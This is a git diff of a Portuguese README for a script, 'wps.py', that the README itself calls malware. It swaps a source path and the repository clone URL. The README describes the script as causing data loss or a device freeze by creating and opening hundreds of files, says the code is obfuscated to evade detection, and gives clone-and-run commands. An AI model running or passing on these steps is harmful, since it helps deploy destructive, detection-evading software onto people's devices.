@@ -20,7 +20,7 @@ Este script é **malware** e pode causar **perda de dados** ou travamento do sis
 3. Cria 300 arquivos de teste, abre cada um no bloco de notas para travar o dispositivo (simulação de ataque).  
 
 > O código foi **ofuscado e minimizado** para dificultar a detecção.  
-> O código original está em `SOURCECODE/wps.py`.
+> O código original está em `sorce-code/wps.py`.
 
 ---
 
@@ -29,7 +29,8 @@ Este script é **malware** e pode causar **perda de dados** ou travamento do sis
 ```bash
 pkg install python3
 pkg install git
-git clone https://github.com/DarkZer010/TWps
-cd TWps
+git clone https://github.com/voidh7/Wps-droid
+cd Wps-droid
 pip install -r requirements.txt
 python3 wps.py
+```
